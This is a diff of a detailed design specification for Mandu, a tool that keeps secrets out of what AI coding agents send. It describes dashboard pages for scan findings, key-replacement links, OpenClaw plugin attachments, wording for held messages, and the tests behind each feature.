+  stale words stay for the browser's Find or a screen reader; the
+  before-any-scan step, which lives in that block, is hidden as before.
+  It does not matter whether the page was drawn before. The next read
+  that answers (the next Home poll reads it again) draws the page
+  in full: the good path shows `#scan-end` again every time it draws. A
+  page that is open and drawn keeps its findings through a failed
+  *follow* read (`loadScan(true)` returns before drawing), unchanged.
+  Tests: `home-js-scan.test.ts` (jsdom: drawn, Home, Scan again on a 502,
+  then a poll that answers; and a first read that fails) and the stack
+  test `scan-page-unread.test.ts` (a real DashboardServer stopped between
+  the two openings; no planted value or `$MDU:` token in an answer or the
+  page).
 - **Each finding is a story**, in the terminal report's words
   (launcher/src/scan-command.ts, the story lines), with "masked" where the
   terminal names the placeholder token (the product's word, §4.25u): where
@@ -17613,7 +23871,11 @@ tenant.
   command itself would still have run", by how it got there; a key-like
   value: masked only when Mandu holds it). Whether the sessions ran with
   Mandu is a small footnote ("3 sessions without Mandu; 1 session while
-  Mandu ran (by the time only: …)"). *Details and examples* opens the date
+  Mandu ran (by the time only: …)"); the row's summary, and Home's card's
+  line, count only the sessions not under Mandu, with their dates and ways
+  (`reachedPart`, the kept finding's `outsideMandu`; 2026-10-27, as the
+  terminal report counts, plan 17 §2 *Sessions under Mandu in a leaked
+  finding*). *Details and examples* opens the date
   range, the projects ("2 projects: ~/shop, ~/shop-api") and the examples by
   way they got there (`examplesByHow`, at most 10 each), each with its
   head, the command, file or fetched URL as code, and with or without Mandu. Before the
@@ -17637,6 +23899,101 @@ tenant.
   `home-js-scan.test.ts` (jsdom) and `transcript-scan-kept.test.ts`
   (stack: the real scan, arbiters and dashboard; the served Scan page's
   link followed into Rules).
+- **A key links to where it is replaced** (2026-10-25). A key-shaped value
+  that reached the AI and is in none of your files (*Values that look like
+  keys*) read the same as a test value, with no next step, and a send of
+  one to a host Mandu cannot tie to it had no link either. Such a row now
+  gets one line under its story, before *Change it in Rules* and the
+  footnote: "If this key is still yours, replace it on GitHub: **Personal
+  access tokens**", from §4.25r's table (`ScanItemVM.replaceAt`, built from
+  the row's `kind`, the detector's rule id, by `replaceAtFor(…, { unsure:
+  true })`). Whose key it is is not known, as the section's own sentence
+  says, so the lead is conditional; the `maybe` form reads "If it is your
+  OpenAI key, replace it on OpenAI: **API keys**", and AWS and GitLab keep
+  their words after the link. A send of a key-shaped value, in either
+  sends section, gets the same line. None for a row that looks like a test
+  value (told plainly, not counted as a leak), for *Kept from the AI by
+  Mandu* (it never reached the AI), for *Your secrets that reached the AI*
+  and a send from one of your files (`kind` `known`: the record names no
+  detector for them, so no company), nor for *Values named like a secret*
+  and the rule ids with no page (`npm-token`, `private-key`, `url-password`,
+  `credential-assignment`). Every row of the long tier that is not a test
+  value gets its line, folded past 10 rows and paged by 25 as before. The
+  link opens in a new tab with `rel="noopener noreferrer"`, as on Rules
+  (`replaceLine` in `home.js` draws both). Display only: no route, scan or
+  record change. Tests: `last-scan.test.ts`, `key-pages.test.ts`,
+  `home-js-scan.test.ts` (jsdom: after the story, before the footnote,
+  `href`, `target`, `rel`) and `tests/stack/transcript-scan.test.ts` (a real
+  scan served as `/api/scan`: GitHub's, OpenAI's conditional and Slack's
+  lines, your own none, no value in the answer).
+- **Where the real value is now** (2026-10-29, the lineage mock's ★2;
+  plan 17 §3 item 15). A finding of yours (*Your secrets that reached the
+  AI*, and *Kept from the AI by Mandu*) opens its *Details and examples*
+  on **Where the real value is now** (`ScanItemVM.detail.where`,
+  `whereNow`; home.js `scanWhereNow`), one row a place, each with how it
+  got there, since when, and what it is now in its tone and mark:
+  - **Where it belongs**: its file and key, "You keep it here" (plain);
+  - **the AI service** that got its real value in a session without Mandu
+    (the provider the story names, else "The AI's provider"): "Got its
+    real value, in N sessions without Mandu", **Can't be taken back**
+    (red); none when every session ran under Mandu;
+  - **each chat-history file** the scan found the value in (`places`,
+    those without Mandu first, at most 10, then "And N more chat-history
+    files the scan counted."): "*Agent*'s chat history", the file as code,
+    "Saved as the AI got it, without Mandu" (red), "…while Mandu ran but
+    not provably under it" (amber), or, under Mandu, "Saved on your
+    computer; the AI got only its masked version, under Mandu" (green),
+    with **Open the session** (or *Session 1, 2…*) to each Mandu session
+    it ran under (`/agents/<id>`).
+  Then what to do: "What reached OpenAI can't be taken back: change the
+  secret where it was issued. Mandu only shows these places; it never
+  changes an agent's chat history." There is no *Remove it*: the mock had
+  one, and the maintainer kept plan 17 §7 item 2 (2026-10-29: the scan
+  stays read-only; rewriting an agent's store can break its resume, and
+  the provider has the requests anyway).
+  The rows are the kept scan's; only what a chat-history row says it is
+  now is the server's, looked at when the row is read (GET
+  `/api/scan/item/<id>`, scan-routes.ts `presenceIn`, `withPresence`): a
+  regular file at that path under the home (`~/…`) or absolute, its link
+  not followed and never a path with `..`, is **Still there** (under
+  Mandu, "Still there, on your computer only"); none is **Gone from this
+  computer** (green); a path it does not take keeps "In it when the scan
+  ran". A `stat` only: the file is never read, and the head and a
+  section's page (cached per kept scan) look at no file. A scan kept
+  before 2026-10-29 has no places, so its rows draw none.
+  **A session card opens its row.** The session page's earlier leak
+  (§4.25b *Where it went*) links to `/scan?item=f3` (`StorySecret.
+  scanItem`, `scanItemIdOf`: the row's id as the page numbers your
+  secrets), and the Scan page opened so (`?item=`, or a link's `data-land`
+  `item:f3`, used once like Rules' `?file=`) opens that row's fold, reads
+  its places and examples, and brings it into view with the focus. A row
+  past the first page of *Your secrets that reached the AI* (2026-11-03;
+  until then the page stayed at its top, for exactly the people with the
+  most leaked secrets) is read on to first, a page at a time with the
+  section's own Show more as Back does (`scanReadTo`, sharing
+  `scanLandPlace`'s scroll anchoring off): at most `k + 1` rows for
+  `f<k>` and 40 reads, stopped at once when the visit, the page or the
+  section box changes (a part of another scan answered 409, a poll's new
+  scan). A row the section does not have once it ends (a newer scan
+  changed the list) says so in a status line under the headline
+  (`#scan-item-missing`): "That secret is not in the last scan's list any
+  more. A newer scan may have changed it."; a page that could not be read
+  says that instead, in the could-not words (§4.25 *Empty states*), and
+  the page stays at its top. A person who scrolled or moved the focus
+  while it read on keeps both: the row still opens and is read. Tests:
+  `last-scan.test.ts` (rows, tones, presence, ids,
+  the record read back), `secret-path.test.ts` (`item`), `scan-pages.test.ts`
+  (component: a real server's presence for a file, a gone one, a link, a
+  folder and a `..`; the 26th of 30 secrets is `f25` and the section's
+  second page starts at it), `home-js-scan-where.test.ts` (jsdom: reading
+  on one and two pages, to the end, a failed read, leaving the page, a
+  focus moved meanwhile) and
+  `home-js-agent-path.test.ts` (jsdom), and the stack tests
+  `transcript-scan-where-now.test.ts` (the real scan, kept file, server
+  and served page; a transcript deleted reads as gone; the scan changed
+  neither transcript), `scan-item-reads-on.test.ts` (the served page over
+  a real server opens the 28th of 30 rows; a row past the end says so)
+  and `session-lineage.test.ts` (the card's `scanItem`).
 - **From the terminal** (2026-10-22): `mandu scan`'s report ends with
   where to see it, `This report is in your dashboard too:
   http://127.0.0.1:<port>/scan` (a running dashboard's Scan page, under
@@ -17657,8 +24014,26 @@ tenant.
   History (*The page links fit a small phone*, *Scan joins the links*:
   below 500 px the links are two rows of three). Until then it was left
   out, as a sixth link ran past a small phone's row. The page is also
-  linked from Home's card and from History's intro ("Sessions your agents
-  ran without Mandu: what the last scan found"), and has its address.
+  linked from Home's card and from History's intro, and has its address.
+- **History's scan line** (2026-10-27): the intro's line on the sessions
+  your agents ran without Mandu follows Home's card (the `scan` of
+  `/api/home`, read by the same poll), its words the card's, never rebuilt
+  in the page. Until then it was fixed in the HTML, "…: what the last scan
+  found", also on a computer where no scan had run. Three states:
+  - **no scan kept** (`ran: false`): "Sessions your agents ran without
+    Mandu are not listed here. `mandu scan` reads them and shows which of
+    your secrets already went to the AI. How it works." The command is the
+    card's own run part, with its Copy (§4.25b); *How it works* links the
+    Scan page;
+  - **a scan kept** (`ran: true`): "Sessions your agents ran without Mandu:
+    [the card's headline]. [its `when`]." The headline links the Scan page;
+    a `bad` tone puts Home's ✗ beside it, in red;
+  - **no card** (an older server, a dashboard without the scan route, a
+    Home read not answered yet or failed): "Sessions your agents ran without
+    Mandu: [the Scan page].", the page's own first state, so it never
+    claims a scan while it waits.
+
+  The line is drawn again only when what it shows changes (`sameAsDrawn`).
 - **The suggestions** the scan filed for files no rule covers (plan 17 §3
   item 13) are ordinary rows of the Suggested view (§4.25r): source
   `past-sessions`, "Suggested by mandu scan", the key names as "Reached the
@@ -17719,8 +24094,13 @@ tenant.
   wide (across, from 540 px of figure) and tall (down: this computer above,
   the internet below, each label beside its glyph, so no label is under
   about 13 px on a 360 px phone); a container query picks one. The only
-  motion is CSS (the lanes' dots flow, the key and the mask ride them),
-  stopped under `prefers-reduced-motion: reduce`. Each of your secrets on
+  motion is CSS (the lanes' dots flow, the key and the mask ride them). It
+  plays once on arrival, for under 5 s (the flow 4 × 1.1 s, the ride one
+  4.8 s run out and back), then holds still on its resting frame: the dots
+  on the lanes, the key and the mask at their own place (WCAG 2.2.2 *Pause,
+  Stop, Hide*; it looped forever until 2026-11-02). A reload, or coming
+  back to the page, plays it again. It is stopped from the start under
+  `prefers-reduced-motion: reduce`. Each of your secrets on
   the page, and those kept by Mandu, carries the same flow small, as chips
   (`flow`).
 
@@ -17749,10 +24129,14 @@ figure's two rows in both layouts with the finding's facts as text, the
 With row's plain internet, Home's flows and green line, and that home.js
 declares each top-level function once: a second `shortPath` passed in
 jsdom and broke the real page), `css-reduced-motion.test.ts` (the figure's
-motion stops), and the stack test `tests/stack/scan-page-figure.test.ts`
-(a real dashboard and a real headless Chromium with reduced motion: the
-tall layout at 360 px with no horizontal scroll, the wide one at 1280 px,
-the tones and words, the lanes still, no planted value). The pages
+motion stops under reduce motion; otherwise it is finite, at most 5 s, and
+its keyframes end where they start), and the stack test
+`tests/stack/scan-page-figure.test.ts` (a real dashboard and a real
+headless Chromium with reduced motion: the tall layout at 360 px with no
+horizontal scroll, the wide one at 1280 px, the tones and words, the lanes
+still, no planted value; then without it: the figure's animations run on
+arrival, each ends within 5 s, all finish, and the key and the mask rest
+at no transform, the dots at offset 0). The pages
 (2026-10-22): `test/unit/view-model/last-scan-pages.test.ts` (the head's
 rows and counts, a section paged to its end once each, the query over
 the whole section, a row's examples, ids and sections it does not have,
@@ -17772,6 +24156,180 @@ reads the page again), the stack test `tests/stack/scan-page-large.test.ts`
 examples read when opened, no planted value), and
 `transcript-scan.test.ts`'s oracle, which reads every section's pages and
 every row's examples.
+
+#### 4.25aj Plugins: where Mandu is attached to an agent it does not start (2026-10-25)
+
+Mandu attaches to a resident OpenClaw Gateway as a plugin, beside the
+resident service (`mandu serve`, its proxy pool;
+[openclaw-plugin.md](../agents/openclaw-plugin.md) §3.2–3.4). Until now the
+product said so only in Home's exposure notice (§4.25x) and on the
+session's page; `mandu serve status` was the one place to read the
+attachment itself. The **Plugins** page (`/plugins`, the seventh page link,
+*Plugins joins the links* above) is that place on the product page, made
+for more hosts than one.
+
+- **The projection.** `GET /api/plugins` (`server/plugin-routes.ts`
+  `gatherPluginFacts` → `view-model/plugins.ts` `pluginsPage`). The facts
+  are what `mandu serve status` reads (launcher `serve-attachments.ts`
+  `gatherAttachments`), from the same contract (`attachment-contract.ts`):
+  the declared sessions (`serve-attachments` in the path table); whether
+  the pool runs, in this process (the service's own dashboard,
+  `MANDU_SERVE=1`: `server-main.ts` passes `AttachmentPool.list`, whose
+  state, *starting* among them, is read directly) or in another whose
+  record (`<runtime>/attachments/pool.json`) names a live pid; per session
+  its port file, trusted only as the contract says, and whether the proxy
+  on that port answers `/_mandu/identity` as the session's; its pool
+  record's secret registration; the attachments the arbiter holds with
+  when each began (`humanPlaneStatus`, read-only; unknown, never "not
+  registered", when it does not answer); and which sessions have a
+  record. Open in the read gate like `/api/scan`: agents, sessions,
+  counts, states and fixed sentences, **never a port** (a local program
+  that learned it could speak to the proxy as the session), a path or a
+  value. The live store's, the same for every tenant (an attachment's
+  proxy is tenant `live`).
+- **The hosts the product knows** (`PLUGIN_HOSTS`): OpenClaw only. Each
+  host has its kind (the attachment kind, `AttachmentGap`), its name, its
+  group's title ("Mandu in OpenClaw"), what Mandu covers there ("Mandu in
+  OpenClaw keeps your secrets out of what the AI sees. Files, programs and
+  their network are not covered here; for that, run `mandu openclaw
+  gateway`."), its attach commands and the History search for its
+  sessions. OpenShell's place is marked in the list's comment: it is
+  listed once it has an attachment kind (its gap, coverage row and
+  sentence in `confinement-posture.ts`, its kind in the contract's
+  `DECLARED_KINDS`, its `mandu <host> install`), so the page never offers
+  a set-up that does not exist.
+- **The page.** The service's line first, in one of three forms: "The
+  Mandu service is running." (green, ✓; "It keeps Mandu attached to 1
+  agent below." or "Nothing is attached to it yet."); "The Mandu service
+  is not running." with a card on the page (any declared or still-held
+  session; amber, !; "Plugins need it: … Start it with `mandu serve
+  start`, or set it up the first time with `mandu serve install`."); or
+  the same headline with no card at all (`tone: "plain"`, no colour and no
+  mark; "You need it only to attach Mandu to an agent as a plugin; the
+  steps are below.", no command). *Amber only when something of yours
+  depends on it (2026-10-26).* Until then the line was amber whenever the
+  service was stopped, so everyone who runs only `mandu claude` or `mandu
+  codex` met a warning about nothing on the seventh page link, which
+  teaches that amber can be ignored (§4.25ai *Color with meaning*). With no
+  card nothing depends on the service, and the host's set-up below already
+  starts with `mandu serve install`; the choice uses only the cards
+  `pluginsPage` builds. Then a block per host: its
+  title and what it covers, then a card per attached agent, or, with none,
+  "Not attached. To attach OpenClaw, run:" and its commands in order
+  (`mandu openclaw install`, `openclaw gateway restart`; with the service
+  stopped `mandu serve install` first). Each set-up step, the stopped
+  line's two commands, a card's cost notice's fix and a lost route's fix
+  have a Copy beside each command (2026-10-28, #147; §4.25b *A command
+  Mandu asks you to run has one too*); the agent and session names do not.
+- **A card** (`PluginCardVM`): its state as a headline with its mark and
+  tone (`attached` "Attached", green: every AI request of the agent goes
+  through Mandu; `starting`, amber; `lapsed` "Not registered", red: the
+  proxy answers but the arbiter holds it no more, so the service stops the
+  proxy and registers again, and its requests fail rather than go out
+  unmasked; `down` "Not answering", red, with `mandu serve status`;
+  `unknown`, amber, the arbiter did not answer; `detaching` "Detached",
+  amber, no longer declared, its hold runs out; `stopped` "Not running",
+  red: still set up, so the Gateway's requests fail until the service runs
+  again), then its facts (*Agent* "OpenClaw's agent `main`, session
+  `openclaw:main`"; *AI requests* the proxy answering or not; *Registered*;
+  *Secret files* "2 secret files registered of 3 found"; *Since*, when the
+  arbiter first held it, as the page's times are drawn), then
+  "Protection here: gated." with the sentence of the shared copy
+  (`resolvePosture(ATTACHMENT_COVERAGE[kind])`, `postureSentence`: the
+  AI sees your secrets masked, but the programs read real files, connect
+  anywhere and can read Mandu's records; no egress promise), then, while
+  the arbiter holds it, the cost: "While this runs, your other agents lose
+  a check." with what that means and the fix Home's notice gives
+  (`human-plane.ts PLUGIN_EXPOSURE_FIX`, shared, so the two cannot
+  drift), and its links: *Open its session* (the session page, when the
+  session has a record) and *Its sessions on History* (History found by
+  "OpenClaw": `data-land` `q:<words>` opens History with its search box
+  filled, Back as usual).
+- **A lost route** (the service's route check, openclaw-plugin.md §3.6:
+  the config no longer sends the model's requests, or Mandu's plugin,
+  through Mandu, or cannot be read). The check's word reaches the arbiter
+  as `updateAttachment {token, coverage, route}` and the arbiter records it
+  as a new posture of the attachment, believed on the admin channel only;
+  the session list takes the attachment's NEWEST BELIEVED record
+  (`session-health.ts attachmentRoute`, never a claim), as Home's route
+  card does (`view-model/attachment-route.ts`). The page reads the same
+  (`PluginSessionFacts.route`: `{state: "ok"}` or `{state: "lost",
+  problems, since}`, and `recorded`, the posture that record decided),
+  counted while the attachment is live, as on Home. A lost route turns the
+  card `route-lost` "Not going through Mandu", red: "OpenClaw's config was
+  changed: <each problem>. A Gateway already running keeps the config it
+  loaded until it restarts; once it runs with this one, the AI can read
+  your secrets as they are." and Home's fix word for word
+  (`ROUTE_FIX_PARTS`: `mandu openclaw install`, then `openclaw gateway
+  restart`; `mandu openclaw uninstall` if the change was on purpose); its
+  posture is the record's (`gated` / `model-route-lost` with that gap's
+  sentence when the model route is lost). A problem is shown without the
+  service proxy's loopback address and with a file by its name only
+  (`routeProblemWords`; the page names no port or path, though Home's card
+  names the config). Restored (the check's full coverage again), the card
+  is attached again.
+- **Follows the service.** Each Home poll reads the page again while it is
+  shown (a proxy that stops answering, an agent attached since); an answer
+  the same as the last draws nothing again (`sameAsDrawn`). A read that
+  fails says so ("The Plugins page could not be read." and why).
+- **A plugin session's page.** The session `openclaw:main` is a session
+  page like a launch's: its proxy writes the steps, and the read where
+  Mandu masked a secret draws with **Show the real value** (the promo
+  video's dashboard ending). One thing had to change: every record the
+  pool's proxy writes is a claim (arbiter-human-plane.md §10.2), because
+  the attachment itself holds the human plane exposed (§10.1.2), and the
+  reveal route read believed events only, so the button drew and showed
+  nothing (404). Now the route's scope is `revealScopeEvents`: the
+  believed events, or, for a session the arbiter's own believed record of
+  a registration names as an attachment (a `launch_posture`, emitter
+  `arbiter`, with `attachment`), every event of it. What that admits is a
+  token a program in the Gateway wrote into that session's record, shown
+  only to the signed-in person on a click (the route needs the admin
+  session and the CSRF header), never to the AI or a program; a forger
+  cannot make a session an attachment (what a program of an agent writes
+  is a claim, from the data socket or the exposed human socket, and the
+  arbiter takes no `launch_posture` emit for a live attachment's session
+  at all). Nothing else widens: verdicts, counts, folders,
+  the inline originals (`revealValues`) and *Your secrets* still read
+  believed events only, and the page still says Mandu could not check the
+  record (§4.25ah).
+- **The words.** Product words only ("Mandu in OpenClaw", "attached",
+  "the Mandu service", "AI requests", "masked", the commands as code); the
+  posture's name is shown as `mandu serve status` and `mandu doctor` show
+  it, beside its plain sentence. No inspector term, no "attachment",
+  "pool", "attestation" or "claim", and no retired word in its own copy
+  ("masked", never "placeholder"; only the shared posture sentence keeps
+  its own words) (`plugins.test.ts` sweeps every state;
+  the home sweep reads `index.html` and `home.js`).
+
+Display only; nothing on the security path but the reveal's scope above.
+Tests: `test/unit/view-model/plugins.test.ts` (nothing attached, the
+service stopped, one live, one lapsed, down, starting, unknown, detached,
+stopped, a lost route from the believed record and one restored, the posture and sentence from the shared
+copy, Home's fix, the links, the words in every state, no port or path,
+OpenClaw only), `test/unit/server/plugin-routes.test.ts` (the facts over
+temp files laid out as the pool lays them out: no record, a live and a
+dead pool pid, a trusted port file and an answering proxy, a port file
+others can write, another session's proxy, no port file, an attachment
+held without a declaration, no arbiter answer, this process's own pool;
+the answer carries no port or path), `test/unit/ui/home-js-plugins.test.ts`
+(the page in jsdom: the route, the service's line and marks, the card's
+facts, posture, cost and links, History found by "OpenClaw", the set-up,
+the service stopped, a failed read, text never markup, the poll),
+`test/unit/server/secret-reveal-routes.test.ts` (an attachment session's
+claimed read revealable; a forged registration widens nothing), and the
+stack tests `tests/stack/plugins-page.test.ts` (a real arbiter with a
+registered attachment, the real proxy answering as `openclaw:main`, its
+port file and the pool's records: `/api/plugins` reports the card, the
+served page draws it and its link opens the session page; a lost route
+recorded on the exposed human socket (a claim) leaves it attached, on the
+admin channel (believed) turns it red with the re-attach commands, and
+restored it is attached again; then lapsed,
+down and the service stopped; no value, token, port or path) and
+`tests/stack/plugin-session-page.test.ts` (the pool's order over the real
+arbiter and proxy: OpenClaw's `read` of `.env` masked on the way to the
+model, the session page's read step with Show the real value showing the
+file's own value signed in, none signed out).
 
 ### 4.26 🖥 VM matrix — the OS test matrix's recorded runs
 
@@ -18384,7 +24942,13 @@ served from cache). A file whose mtime or ctime is less than 2 s old (or in
 the future) gets an identity that matches nothing: it is re-read on every use
 and neither cached nor persisted until older. Any later write then stamps a
 time past the cached one, so a matching identity is safe. Tests that pin cache
-hits on fresh files turn the window off (`setRacyWindowMs(0)`).
+hits on fresh files turn the window off (`setRacyWindowMs(0)`); a test that
+pins a fresh file as racy sets a window longer than the test runs (an hour),
+never the 2 s default, which a loaded host outlasts between two listings
+(2026-10-23: the persisted-cache test saw its files settle by the clock and
+persisted, rightly, their by-then stable identities). The window is not a
+clock the persister trusts: the save re-stats every entry, so an entry read
+while racy is dropped even when the file has settled by the time of the save.
 
 **The persisted listing cache (`src/listing-cache-file.ts`).** The replay
 listings' small derived rows are saved to `listings.json.gz` in the path
@@ -18696,12 +25260,16 @@ refuses it.
 
 **The product page's card** (Approvals and the home's waiting list): a row
 keyed `prompt:` is the family `prompt`: "<agent> wants to send your message to
-the AI. It holds <category>." with Send as written, Send masked and Cancel
-the message (and on Approvals, Send as written for this session). The card
+the AI. It holds <kind>." with Send as written, Send masked and Cancel
+the message (and on Approvals, Send as written for this session). The kind
+is named as Settings names it ("a card number", `categoryWords`), and an
+organization's own category, which has no words, as code (§4.34 *A held
+message names its kind in words*). The card
 fetches the found text from the holds route (with the CSRF header; it is
-never part of `/api/home`). The Rules page words a past answer by category
-and reach (`promptAnswerWords`), under *Sending data*, the category as code
-(§4.25u *Rules names a held message's answer*). The inspector's Approvals card offers the
+never part of `/api/home`). The Rules page words a past answer by kind
+and reach (`promptAnswerWords`), under *Sending data*, a known kind in
+words and any other category as code (§4.25u *Rules names a held
+message's answer*, *A held message's answer names its kind in words*). The inspector's Approvals card offers the
 same four answers and sends them on the hold route, as the product does
 (§4.34).
 
@@ -19034,7 +25602,9 @@ every page (WCAG 2.4.2, *Page Titled*).
 - **Before the scripts run** the served `<title>` is "Mandu · Developer
   view", unchanged.
 
-Not covered: a session page names the page, not the session it shows.
+Not covered: a session page here names the page, not the session it shows.
+The product's session page names its session since 2026-10-28 (§4.25, *A
+session page's tab names its session*); the developer view stays as it is.
 Tests: `page-nav.test.ts` (every page and sub-page, a nav click, a jump,
 Back, the count across a page change), `app-js-badge.test.ts`,
 `app-js-drills-tests.test.ts`, `tests/stack/inspector-page-focus.test.ts`.
@@ -19836,8 +26406,10 @@ page over a real arbiter and dashboard, signed out and in; the radio named
 are named the same; the no-value oracle). Presentation only: no route,
 POST, typed gate, word on screen or CSS changed.
 
-**Remove and Clear taint say what they did (2026-10-12).** The Secrets
-panel's row writes said their answer in the wrong place or not at all.
+**Remove and Clear taint say what they did (2026-10-12).** (Since
+2026-10-26 the product page lists the same derived files read only, under
+Rules › *Files made from your secrets*, §4.25aa; Clear taint stays here.)
+The Secrets panel's row writes said their answer in the wrong place or not at all.
 `removeLabel` and `clearDerived` wrote a refusal into the label form's line
 (`secrets-label-err`): for Remove, under the form below the Labels table;
 for Clear taint, above the *Derived files* heading, a part away from its
@@ -22137,7 +28709,15 @@ Now (`ask-words.ts`, `home.ts`, `home.js`, `egress.js`):
   "The AI's next request goes to `api.stripe.com` with the real secret
   filled in. Mandu refused this one, so nothing was sent."; the file path
   gate, an upload, an escalation, downloaded code, a command that uses
-  masked text and a show say "when it tries again" and the same line;
+  masked text and a show say "when it tries again" and the same line.
+  A card whose asking session has ended (`askerEnded`, below) leaves the
+  line out, wherever its cell has it (2026-10-31, `endedAskWords`): that
+  agent is gone, and the card's own sentence says nothing waits on the
+  answer. The rest of the cell stays, "… Mandu refused this one, so nothing
+  was sent.", on Approvals' full card and in the short card's *What each
+  answer does*; the inspector's words are as before (tests:
+  `ask-after-allow.test.ts` A6–A7, `tests/stack/approvals-ended-last.test.ts`
+  A6);
 - a held open or change (`open:`, `trust:`, `write:`) says whether the
   program still waits. The guard's re-asks bump the row's `lastSeen`, so
   `home.ts heldNow` calls a row asked within `HELD_FRESH_MS` (5 s) held:
@@ -22156,13 +28736,19 @@ Now (`ask-words.ts`, `home.ts`, `home.js`, `egress.js`):
 - the third cell is named for the buttons the card offers: "If you click
   Allow once" when there is no Always allow, on both front ends;
 - a card whose asking session has ended (listed and not running: a
-  recorded exit, or no event for the running window) adds "The agent that
+  recorded exit, or no event for the running window when no live launch of
+  the session remains, §4.10.4) adds "The agent that
   asked has ended, so nothing is waiting on this now. Your answer counts the
   next time an agent asks." (`HomeAsk.askerEnded`; a session not on record
-  claims nothing). On Home that agent is under *Earlier*, its row counting
-  "1 question waiting for you"; only a running agent is "Waiting for your
-  OK". The hero says the same (§4.25, *A question from a session that has
-  ended*);
+  claims nothing), except under Approvals' heading *From sessions that have
+  ended*, which says it once for the cards under it (§4.25, *A question
+  from a session that has ended*, 2026-10-25). Such a card's *If you click
+  Allow* no longer ends "After you answer, tell the agent to try again."
+  (2026-10-31, above), so the card never tells the person to do what it
+  just said nobody can. On Home that agent is
+  under *Earlier*, its row counting "1 question waiting for you"; only a
+  running agent is "Waiting for your OK". The hero says the same (§4.25,
+  *A question from a session that has ended*);
 - the moment line names the session that asked last and where it works,
   "· from Claude Code in `~/projects/shop`" (`HomeAsk.askerCwd`,
   `askerAgent`, `askerSessions`; nothing when the folder is not known,
@@ -22181,7 +28767,9 @@ Now (`ask-words.ts`, `home.ts`, `home.js`, `egress.js`):
 - once you answer (2026-10-22), the line left where the card was repeats
   it: "Allowed once: send your secret `STRIPE_KEY` to `api.stripe.com`. Tell
   Claude Code to try again." (`AskWords.afterAllow`, set exactly for the
-  families whose *If you click Allow* says `TELL_AGENT`; "The program goes
+  families whose *If you click Allow* says `TELL_AGENT`, and dropped with
+  it from an ended asker's card, whose line reads "Your answer counts the
+  next time an agent asks." instead; "The program goes
   on now." for a held program still waiting), so a person who answers from
   Home, whose card shows no *If you click Allow*, reads it too (§4.25 *An
   answer says what it did*).
@@ -22223,7 +28811,8 @@ yourAnswer`):
   standing answer and nothing more (the same verdict routes, `deny` and
   `approve`);
 - a send, a read or a command keeps Blocked, Allowed once and Block
-  instead / Allow instead.
+  instead / Allow instead (*Always allow instead* since 2026-10-27, §4.25
+  *Past the newest 20*).
 
 Security: this removes a button that granted more than it said; no answer
 grants more than before. Tests: `home-view-model.test.ts` (each outcome and
@@ -22234,6 +28823,29 @@ anthropic-proxy holds two messages; Send masked reads `masked` with no
 reversal; Send as written for the session reads `sent-session`, the
 session's row offers Send masked instead, the next message goes as written,
 and after Send masked instead over the real route the next one goes masked.
+
+**A held message names its kind in words** (2026-10-23). The card's
+sentence took the category straight from the row's subject and drew it as
+code: "Claude Code wants to send your message to the AI. It holds
+`pii.payment-card`." Settings › Prompt filters, where the person set that
+kind to **Ask me**, and the session page's note under a message call it "a
+card number" (`prompt-settings.ts categoryWords`). Now `ask-words.ts
+describeAsk` names a kind Mandu has words for as Settings names it, in
+text, with no code: "… It holds a card number.", "… It holds a Stripe
+key." The noun phrase is `categoryWords`' as is, its article included. An
+organization's own category (`acme.codename`), which has no words, stays
+a code, as Settings shows it as written. Every surface that reuses the
+sentence follows: Home's and Approvals' cards, the session page's *Needs
+your OK*, *Answered earlier*, and the browser notification's body. Rules
+names the answer the same way (§4.25u *A held message's answer names its
+kind in words*). Presentation only: the rows, their subjects and keys,
+the routes and the answers are unchanged, and the found text is in none
+of these words. Tests: `home-view-model.test.ts` (a card number and a
+Stripe key in words with no code part, `acme.codename` as code) and stack
+`approval-held-message-answers.test.ts` (a pack pattern of category
+`pii.email` set to ask, over the real arbiter, proxy and dashboard: the
+served Approvals card reads "It holds an email address." with no code, the
+address on no open route, and the model got it masked).
 
 **A held message's deadline** (2026-10-22). The arbiter holds a held
 message's request 30 s by default (`DEFAULT_PROMPT_HOLD_MS`,
@@ -22320,6 +28932,103 @@ stack `approval-stale-answers.test.ts` (the real arbiter on such a DB behind
 the real dashboard: nothing waits, a stale page's answer is 409, both routes
 mark the answers, the served row says why with no button).
 
+**Answers sit under their day** (2026-10-28). Approvals › *Answered
+earlier* was one flat run of rows: the day of an answer was only in its
+small dim time line ("Oct 25, 10:31 · 2 hours ago"), so in a long list
+(Show more, Find) the day a run of answers belonged to had to be read off
+each row, and a screen reader had no heading to go from day to day. Now
+History's day heading (§4.25ae *Sessions sit under their day*: the same
+words from `dayWords`, "Today", "Yesterday", "Friday, Jul 10", with the
+year when it is not this year, the same `.history-day` look) goes before
+the first row of each local day an answer was given (`decidedAt`), drawn
+by `historyDay` with the tag `h3`, under the section's `h2` "Answered
+earlier" (History's are `h2` under the page `h1`). `drawAnswered` draws
+every row read at once, so a Show more that continues the last day adds
+no second heading and its first row (not a heading) takes the focus; a
+Find result is grouped the same way, and "No answer matches" has none. A
+row with no time starts no day. The row's own time line stays. The
+heading carries no `data-id`, so the lists of answered cards
+(`drawnCards`, the words and focus of an answer, `putBackAnswers`) and
+the mark of a linked answer (`markApprovalsAsk`) pass it by; it is a block
+in the `.table`, so it spans the row's three columns and its one column
+under 640 px alike. `refreshWhen` says its words again on every poll, as
+History's, so past midnight "Today" reads "Yesterday". Since 2026-10-28
+Rule changes, the section below, draws the same headings over its
+changes (§4.25 *Changes sit under their day*). Nothing new is served; what an answer
+does and its reversal are unchanged. Tests: unit
+`home-js-answered-days.test.ts` (a fixed clock in Seoul: today, yesterday
+and an older day once each in order, two answers of a day under one
+heading, a row with no time, Show more on the same and on a new day with
+the focus on the row, a Find result, midnight, a linked answer marking
+its row), component `approvals-after-answer.test.ts` (the real
+`DashboardServer`: the answers it serves sit under Today).
+
+**Go to a day on Answered earlier** (2026-11-04). Answered earlier is where
+a person checks what they let through or blocked ("what did I allow on
+Tuesday?") and undoes it, but it reached past its newest 20 only by Show
+more, a read of 20 at a time, and *Finding an answer* helps only when the
+secret, the host or the agent is remembered. History has had *Go to a day*
+since 2026-10-29 (§4.25ae); its implementer named this list as the
+follow-up, and the two lists of the past now behave alike. Beside *Find an
+answer*, in `#answered-search`, sits the same labelled native date box,
+**Go to a day** (`#answered-day`, in `.history-go-day`, so it wraps the
+same way under 500 px; today its latest day, no earliest), and **Show the
+newest** (`#answered-newest`) beside it while a day is set, outside the
+status line `#answered-count`, a live region. History's *Go to a day*
+holds the shared rules: the bound is the start of the day after the chosen
+one as the browser reckons it (`historyDayEnd`), parsed by the server with
+`historyBeforeParam`; the day lives in the address, `/approvals?day=2026-10-20`
